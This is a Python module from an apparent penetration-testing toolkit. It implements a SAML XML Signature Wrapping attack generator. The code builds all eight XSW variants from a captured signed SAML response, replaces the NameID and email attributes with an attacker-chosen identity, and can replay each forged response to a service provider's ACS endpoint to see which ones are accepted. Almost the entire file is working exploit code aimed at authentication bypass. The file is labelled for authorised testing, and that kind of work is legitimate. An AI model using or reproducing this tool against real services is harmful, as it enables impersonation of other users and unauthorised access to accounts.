#!/usr/bin/env python3
"""
redshift_toolkit.web.saml_attacker — SAML XSW (Signature Wrapping) generator.

Why this matters
----------------
SAML signatures protect a *subset* of the response (typically the assertion or
the response itself, identified by a Reference URI / Id). If the parser that
*verifies* the signature uses a different XPath than the parser that *consumes*
identity claims, the attacker can wrap a malicious assertion around the legit
signed one. This is "XML Signature Wrapping" (Somorovsky et al, 2012), and
despite being well-known it still ships in production every year (e.g.
Microsoft Azure CVE-2018-0489, OneLogin python-saml CVE-2017-11427).

What this script does
---------------------
Given a *captured* signed SAML response (base64 encoded as it appears in the
HTTP form parameter), generate the eight canonical XSW variants:

    XSW1  Original signed assertion + cloned assertion as Response/Extensions
    XSW2  Original assertion sibling-injected before signed
    XSW3  Cloned response containing original signed assertion
    XSW4  Original signed assertion + cloned at root with attacker NameID
    XSW5  Original signed assertion as descendant of Object element
    XSW6  Original signed assertion inside an Object inside cloned Response
    XSW7  Cloned assertion as child of Extensions
    XSW8  Cloned assertion inside Object inside SignatureValue

Optionally replay each variant against the ACS (Assertion Consumer Service) URL
to see which the SP accepts.

NOTE: This is an **offline transform tool** plus a basic replay client. It does
not break cryptography — it exploits a *parser* differential. You must already
have a valid signed assertion for the target IdP-SP pair (e.g. captured during
your own test login).

Usage
-----
    # Generate XSW1-XSW8 from a captured response
    python3 -m redshift_toolkit.web.saml_attacker \\
        --in original_response.xml \\
        --attacker-nameid evil@target.example \\
        --out-dir ./xsw_variants

    # Generate AND replay against ACS
    python3 -m redshift_toolkit.web.saml_attacker \\
        --in original_response.xml \\
        --attacker-nameid evil@target.example \\
        --acs-url https://sp.example.com/saml/acs \\
        --relay-state /home

Author: Redshift Project — Module 17 (Auth & AuthZ)
License: MIT — authorised testing only.
"""
from __future__ import annotations

import argparse
import base64
import copy
import json
import os
import re
import sys
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlencode
from xml.etree import ElementTree as ET

from .http_client import HttpRequest, send


GREEN, RED, YELLOW, CYAN, GREY, BOLD, RESET = (
    "\x1b[32m", "\x1b[31m", "\x1b[33m", "\x1b[36m", "\x1b[90m", "\x1b[1m", "\x1b[0m",
)


def paint(t: str, c: str, *, enabled: bool = True) -> str:
    return f"{c}{t}{RESET}" if enabled else t


# SAML namespaces
NS = {
    "samlp": "urn:oasis:names:tc:SAML:2.0:protocol",
    "saml":  "urn:oasis:names:tc:SAML:2.0:assertion",
    "ds":    "http://www.w3.org/2000/09/xmldsig#",
}
for k, v in NS.items():
    ET.register_namespace(k if k != "samlp" else "samlp", v)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def find_assertion(root: ET.Element) -> Optional[ET.Element]:
    return root.find("saml:Assertion", NS)


def find_signature(elem: ET.Element) -> Optional[ET.Element]:
    return elem.find("ds:Signature", NS)


def replace_nameid(elem: ET.Element, new_nameid: str) -> int:
    """Replace all NameID values in the assertion subtree. Returns count."""
    count = 0
    for n in elem.iter("{urn:oasis:names:tc:SAML:2.0:assertion}NameID"):
        n.text = new_nameid
        count += 1
    # Also Subject's children that often carry email
    for n in elem.iter("{urn:oasis:names:tc:SAML:2.0:assertion}Attribute"):
        name = n.get("Name", "").lower()
        if any(k in name for k in ("email", "upn", "name", "nameidentifier")):
            for av in n.findall("saml:AttributeValue", NS):
                av.text = new_nameid
                count += 1
    return count


def regen_ids(elem: ET.Element, prefix: str = "_attacker_") -> None:
    """Give the cloned subtree fresh IDs so XML schema validators don't choke."""
    i = 0
    for el in elem.iter():
        if "ID" in el.attrib:
            el.attrib["ID"] = f"{prefix}{i}"
            i += 1


# ---------------------------------------------------------------------------
# XSW variants
# ---------------------------------------------------------------------------
def xsw1(root: ET.Element, attacker_nameid: str) -> ET.Element:
    """XSW1: Wrap original signed Response. Outer = evil clone, inner Object = original."""
    out = copy.deepcopy(root)
    orig_assert = find_assertion(out)
    if orig_assert is None:
        return out
    sig = find_signature(orig_assert)
    if sig is None:
        return out
    # Move original signature to an Object element while leaving evil assertion in main flow
    obj = ET.SubElement(sig, "{http://www.w3.org/2000/09/xmldsig#}Object")
    evil = copy.deepcopy(orig_assert)
    regen_ids(evil)
    replace_nameid(evil, attacker_nameid)
    obj.append(copy.deepcopy(orig_assert))
    # Replace the in-flow assertion with the evil one
    out.remove(orig_assert)
    out.append(evil)
    return out


def xsw2(root: ET.Element, attacker_nameid: str) -> ET.Element:
    """XSW2: Sibling-inject evil assertion before the signed one (parser-first wins)."""
    out = copy.deepcopy(root)
    orig_assert = find_assertion(out)
    if orig_assert is None:
        return out
    evil = copy.deepcopy(orig_assert)
    regen_ids(evil)
    replace_nameid(evil, attacker_nameid)
    # Detach signature from evil so verification still goes to the real one
    sig = find_signature(evil)
    if sig is not None:
        evil.remove(sig)
    # Insert before original
    children = list(out)
    idx = children.index(orig_assert)
    out.insert(idx, evil)
    return out


def xsw3(root: ET.Element, attacker_nameid: str) -> ET.Element:
    """XSW3: Evil assertion at root, original signed assertion as child of evil."""
    out = copy.deepcopy(root)
    orig_assert = find_assertion(out)
    if orig_assert is None:
        return out
    evil = copy.deepcopy(orig_assert)
    regen_ids(evil)
    replace_nameid(evil, attacker_nameid)
    # Strip evil's signature
    s = find_signature(evil)
    if s is not None:
        evil.remove(s)
    # Nest the original (signed) inside evil
    evil.append(copy.deepcopy(orig_assert))
    out.remove(orig_assert)
    out.append(evil)
    return out


def xsw4(root: ET.Element, attacker_nameid: str) -> ET.Element:
    """XSW4: Like XSW3 but original is sibling, not nested."""
    out = copy.deepcopy(root)
    orig_assert = find_assertion(out)
    if orig_assert is None:
        return out
    evil = copy.deepcopy(orig_assert)
    regen_ids(evil)
    replace_nameid(evil, attacker_nameid)
    s = find_signature(evil)
    if s is not None:
        evil.remove(s)
    out.insert(list(out).index(orig_assert), evil)
    return out


def xsw5(root: ET.Element, attacker_nameid: str) -> ET.Element:
    """XSW5: Original assertion under Object inside its own Signature, evil at top."""
    out = copy.deepcopy(root)
    orig_assert = find_assertion(out)
    if orig_assert is None:
        return out
    sig = find_signature(orig_assert)
    if sig is None:
        return out
    obj = ET.SubElement(sig, "{http://www.w3.org/2000/09/xmldsig#}Object")
    obj.append(copy.deepcopy(orig_assert))
    evil = copy.deepcopy(orig_assert)
    regen_ids(evil)
    replace_nameid(evil, attacker_nameid)
    es = find_signature(evil)
    if es is not None:
        evil.remove(es)
    out.remove(orig_assert)
    out.append(evil)
    return out


def xsw6(root: ET.Element, attacker_nameid: str) -> ET.Element:
    """XSW6: Original signed Response inside Object, attacker Response wraps it."""
    out = copy.deepcopy(root)
    orig_clone = copy.deepcopy(out)
    obj = ET.Element("{http://www.w3.org/2000/09/xmldsig#}Object")
    obj.append(orig_clone)
    # Clear out's children and add evil assertion + Object
    for child in list(out):
        out.remove(child)
    evil = ET.SubElement(out, "{urn:oasis:names:tc:SAML:2.0:assertion}Assertion")
    sub = ET.SubElement(evil, "{urn:oasis:names:tc:SAML:2.0:assertion}Subject")
    nid = ET.SubElement(sub, "{urn:oasis:names:tc:SAML:2.0:assertion}NameID")
    nid.text = attacker_nameid
    out.append(obj)
    return out


def xsw7(root: ET.Element, attacker_nameid: str) -> ET.Element:
    """XSW7: Evil assertion under <Extensions>; original sits as before."""
    out = copy.deepcopy(root)
    orig_assert = find_assertion(out)
    if orig_assert is None:
        return out
    ext = ET.SubElement(out, "{urn:oasis:names:tc:SAML:2.0:protocol}Extensions")
    evil = copy.deepcopy(orig_assert)
    regen_ids(evil)
    replace_nameid(evil, attacker_nameid)
    s = find_signature(evil)
    if s is not None:
        evil.remove(s)
    ext.append(evil)
    return out


def xsw8(root: ET.Element, attacker_nameid: str) -> ET.Element:
    """XSW8: Evil assertion buried in Object inside Signature."""
    out = copy.deepcopy(root)
    orig_assert = find_assertion(out)
    if orig_assert is None:
        return out
    sig = find_signature(orig_assert)
    if sig is None:
        return out
    evil = copy.deepcopy(orig_assert)
    regen_ids(evil)
    replace_nameid(evil, attacker_nameid)
    es = find_signature(evil)
    if es is not None:
        evil.remove(es)
    obj = ET.SubElement(sig, "{http://www.w3.org/2000/09/xmldsig#}Object")
    obj.append(evil)
    return out


VARIANTS: Dict[str, callable] = {
    "XSW1": xsw1, "XSW2": xsw2, "XSW3": xsw3, "XSW4": xsw4,
    "XSW5": xsw5, "XSW6": xsw6, "XSW7": xsw7, "XSW8": xsw8,
}


# ---------------------------------------------------------------------------
# Replay
# ---------------------------------------------------------------------------
def replay_acs(acs_url: str, saml_response_b64: str, *,
               relay_state: str = "", timeout: float = 15.0) -> Dict[str, str]:
    body = urlencode({"SAMLResponse": saml_response_b64, "RelayState": relay_state})
    req = HttpRequest(
        method="POST", url=acs_url,
        headers=[("Content-Type", "application/x-www-form-urlencoded")],
        body=body.encode(),
    )
    try:
        resp = send(req, timeout=timeout, follow_redirects=False)
        return {
            "status": str(resp.status),
            "location": resp.get_header("location") or "",
            "set_cookie": (resp.get_header("set-cookie") or "")[:200],
            "body_excerpt": (resp.body or b"")[:300].decode("utf-8", errors="replace"),
        }
    except Exception as e:
        return {"error": str(e)}


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------
def parse_input(path: str) -> ET.Element:
    raw = open(path, "rb").read()
    # Accept either raw XML or base64-encoded XML
    try:
        return ET.fromstring(raw)
    except ET.ParseError:
        decoded = base64.b64decode(re.sub(rb"\s+", b"", raw))
        return ET.fromstring(decoded)


def serialize(root: ET.Element) -> bytes:
    # Hand-prepend XML declaration for SP-friendliness
    body = ET.tostring(root, encoding="utf-8")
    return b'<?xml version="1.0" encoding="UTF-8"?>\n' + body


def main(argv: Optional[List[str]] = None) -> int:
    p = argparse.ArgumentParser(prog="saml_attacker",
                                description="SAML XSW1-XSW8 generator + ACS replay.")
    p.add_argument("--in", dest="infile", required=True,
                   help="path to original signed SAML Response (XML or base64)")
    p.add_argument("--attacker-nameid", required=True)
    p.add_argument("--out-dir", default="./xsw_variants")
    p.add_argument("--acs-url", help="if set, POST each variant to this URL")
    p.add_argument("--relay-state", default="")
    p.add_argument("--variants", default="XSW1,XSW2,XSW3,XSW4,XSW5,XSW6,XSW7,XSW8")
    p.add_argument("--timeout", type=float, default=15.0)
    p.add_argument("--format", choices=["text", "json"], default="text")
    p.add_argument("--no-color", action="store_true")
    args = p.parse_args(argv)

    root = parse_input(args.infile)
    os.makedirs(args.out_dir, exist_ok=True)

    results: List[Dict[str, str]] = []
    selected = [v.strip().upper() for v in args.variants.split(",") if v.strip()]
    for name in selected:
        fn = VARIANTS.get(name)
        if not fn:
            continue
        try:
            modified = fn(root, args.attacker_nameid)
            xml_bytes = serialize(modified)
            outpath = os.path.join(args.out_dir, f"{name}.xml")
            open(outpath, "wb").write(xml_bytes)
            b64 = base64.b64encode(xml_bytes).decode("ascii")
            row = {"variant": name, "file": outpath, "size": str(len(xml_bytes))}
            if args.acs_url:
                row.update({f"replay_{k}": v for k, v in
                            replay_acs(args.acs_url, b64, relay_state=args.relay_state,
                                       timeout=args.timeout).items()})
            results.append(row)
        except Exception as e:
            results.append({"variant": name, "error": str(e)})

    if args.format == "json":
        print(json.dumps(results, indent=2))
    else:
        c = not args.no_color
        print(paint(f"\n[saml_attacker] generated {len(results)} variants in {args.out_dir}", BOLD, enabled=c))
        for r in results:
            line = f"  {paint(r['variant'], CYAN, enabled=c):8s}"
            if "error" in r:
                line += paint(f" ERROR: {r['error']}", RED, enabled=c)
            else:
                line += f" {r['file']}  ({r['size']} bytes)"
                if "replay_status" in r:
                    st = r["replay_status"]
                    is_ok = st in ("200", "302", "303") and ("redshift" not in r.get("replay_body_excerpt", "").lower())
                    sev = GREEN if is_ok else GREY
                    line += f"  → ACS status={paint(st, sev, enabled=c)}"
                    if r.get("replay_set_cookie"):
                        line += f"  cookie+"
            print(line)

    return 0


if __name__ == "__main__":
    sys.exit(main())
